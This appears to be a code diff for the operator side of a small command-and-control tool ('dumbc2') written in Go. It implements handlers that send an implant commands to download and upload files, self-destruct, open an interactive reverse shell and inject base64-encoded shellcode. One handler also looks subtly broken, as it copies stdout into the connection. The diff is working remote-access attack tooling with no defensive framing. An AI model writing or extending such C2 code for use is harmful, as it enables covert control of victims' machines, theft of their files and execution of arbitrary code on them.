@@ -1,12 +1,15 @@
 package useri
 
 import (
+	"bufio"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"github.com/kmahyyg/dumbc2/config"
 	"github.com/kmahyyg/dumbc2/remoteop"
 	"github.com/kmahyyg/dumbc2/transport"
 	"github.com/kmahyyg/dumbc2/utils"
+	"io"
 	"log"
 	"net"
 	"os"
@@ -14,10 +17,18 @@ import (
 	"time"
 )
 
+const (
+	downloadCmd        = "DWLD"
+	uploadCmd          = "UPLD"
+	selfDestroyCmd     = "BOOM"
+	getShellCmd        = "BASH"
+	injectShellCodeCmd = "INJE"
+)
+
 func StartServer(userOP config.UserOperation) {
 	// server mode
 	fladdr := userOP.ListenAddr
-	lbserver, err := transport.TLSServerBuilder(fladdr, false)
+	lbserver, err := transport.TLSServerBuilder(fladdr, true)
 	if err != nil {
 		panic(err)
 	}
@@ -36,10 +47,9 @@ func StartServer(userOP config.UserOperation) {
 	}
 }
 
-
-func printHelp(){
+func printHelp() {
 	fmt.Println(
-`
+		`
 Usage: 
 bash = Get Shell (Interactive)
 upload <Source File Path> <Destination File Path> = Upload file
@@ -51,7 +61,7 @@ inject <BASE64-Encoded Code> = Execute Shell Code
 `)
 }
 
-func handleClient(conn net.Conn){
+func handleClient(conn net.Conn) {
 	// start as tls server, means it's a reverse shell
 	printHelp()
 	fmt.Println("Connection established.")
@@ -77,10 +87,10 @@ func handleClient(conn net.Conn){
 				log.Println("Exceeds max length, 253M")
 				continue
 			} else {
-				buf := make([]byte,1)
+				buf := make([]byte, 1)
 				binary.PutVarint(buf, fdlen())
 				curRTCmd = &remoteop.RTCommand{
-					Command:        []byte("UPLD"),
+					Command:        []byte(uploadCmd),
 					FilePathLocal:  []byte(useriptD[1]),
 					FilePathRemote: []byte(useriptD[2]),
 					FileLength:     buf[0],
@@ -102,29 +112,73 @@ func handleClient(conn net.Conn){
 			}
 		case "download":
 			curRTCmd := &remoteop.RTCommand{
-				Command:        []byte("DWLD"),
-				FilePathLocal:  nil,
+				Command:        []byte(downloadCmd),
+				FilePathLocal:  []byte(useriptD[2]),
 				FilePathRemote: []byte(useriptD[1]),
 				FileLength:     0,
 				HasData:        0,
 				RealData:       nil,
 			}
-			//todo
+			err := curRTCmd.BuildnSend(conn)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
+			curPingBack, err := remoteop.ParseIncomingPB(conn)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
+			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
+				log.Println(errors.New("Function execution error."))
+			}
 		case "boom":
 			curRTCmd := &remoteop.RTCommand{
-				Command: []byte("BOOM"),
+				Command: []byte(selfDestroyCmd),
 				HasData: 0,
 			}
 			err := curRTCmd.BuildnSend(conn)
 			if err != nil {
 				log.Println(err)
+				continue
+			}
+			curPingBack, err := remoteop.ParseIncomingPB(conn)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
+			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
+				log.Println(errors.New("Function execution error."))
 			}
 			break
 		case "bash":
-			//todo
+			curRTCmd = &remoteop.RTCommand{
+				Command: []byte(getShellCmd),
+				HasData: byte(0),
+			}
+			err := curRTCmd.BuildnSend(conn)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
+			copydata := func(r io.Reader, w io.Writer) {
+				_, err := io.Copy(w, r)
+				if err != nil {
+					log.Println(err)
+				}
+			}
+			go copydata(os.Stdout, conn)
+			scanner := bufio.NewScanner(os.Stdin)
+			for scanner.Scan() {
+				_, err := conn.Write(scanner.Bytes())
+				if err != nil {
+					log.Println(err)
+					break
+				}
+			}
 		case "inject":
 			curRTCmd := &remoteop.RTCommand{
-				Command:    []byte("INJE"),
+				Command:    []byte(injectShellCodeCmd),
 				FileLength: 1, // Max 1M Allowed
 				HasData:    1,
 				RealData:   []byte(useriptD[1]),
@@ -136,9 +190,9 @@ func handleClient(conn net.Conn){
 				continue
 			}
 			curPingBack, err := remoteop.ParseIncomingPB(conn)
+			_ = conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
 			if err != nil {
 				log.Println(err)
-				_ = conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
 				continue
 			}
 			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
